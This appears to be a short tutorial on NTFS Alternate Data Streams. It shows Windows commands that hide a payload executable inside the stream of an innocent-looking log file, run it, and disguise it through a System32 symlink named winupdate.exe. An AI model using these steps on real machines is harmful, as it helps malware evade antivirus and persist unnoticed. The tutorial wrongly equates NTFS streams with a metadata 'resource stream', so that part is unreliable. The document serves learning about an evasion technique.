# Alternate Data Streams

`Alternate Data Streams` is a NTFS file attribute and was designed to provide compatiblity with MacOs HFS (Heirarchical File System).

Any File System on NTFS formatted drive will have two diffrent streams/forks

1. `Data Stream` - contains data of file
2. `Resource Stram` - contains metadata of file


* Attackers can use `ADS` to hide malicious code or executable in legitimate files in order to `evade detection`

This can be done by storing malicious code into the `Resource Stram` (Metadata) of the legitimate file.

This technique is usually used to evade detection from basic signature based AVs and other Static scanning tools.

**************************************************************************************************************************
# Will just see how we can hide data in `resource stream`

C:\Users\Lenovo\Desktop>`notepad test.txt:secret.txt `

# Now add some text in it, but when now we do dir, we still see the size of file is 0 and we cant see secret.txt also in test there is no content

C:\Users\Lenovo\Desktop>`dir `
23-12-2023  20:41                 0 test.txt  

# But the data is there and is hidden in resource stream

# `Attackers Perspective`

# Suppose there is a payload.exe , coped it to temp folder

C:\Users\Lenovo\Desktop>`dir`
25-12-2023  09:48                 0 Payload.exe  

C:\Users\Lenovo\Desktop>`cd /`  
C:\>`mkdir temp  `
C:\>`copy c:\Users\Lenovo\Desktop\Payload.exe c:\temp `

# we can use type command and hide our payload output into the `resource stream` of a legitimate file

C:\temp>`type Payload.exe > windowslogs.txt:mypayload.exe ` 
C:\temp>`dir`  
25-12-2023  09:48                 0 Payload.exe 
25-12-2023  10:00                 0 windowslogs.txt 

# Attacker will typically then enter legitimate data in windowslosgs.txt and also delete the payload.exe to stay hidden

C:\temp>`notepad windowslogs.txt `
C:\temp>`del Payload.exe `  
C:\temp>`dir`  
25-12-2023  10:04                 8 windowslogs.txt 

# Now this payload could be run simply by `Start` command or by creating a symbolic link in system32 by `mklink` command 

C:\temp>`start windowslogs.txt:mypayload.exe `

> below is shown by creating symbolic link

C:\temp>`cd /windows/system32 `
C:\Windows\System32>`mklink winupdate.exe C:\temp\windowslogs.txt:mypayload.exe`
Symbolic link created for winupdate.exe <<==>> C:\temp\windowslogs.txt:mypayload.exe

# Now whenever we/attacker give windupdate command on cmd the payload will run automatically

C:\Windows\System32>`winupdate `


# The same could have done with a payload generate with our msfvenom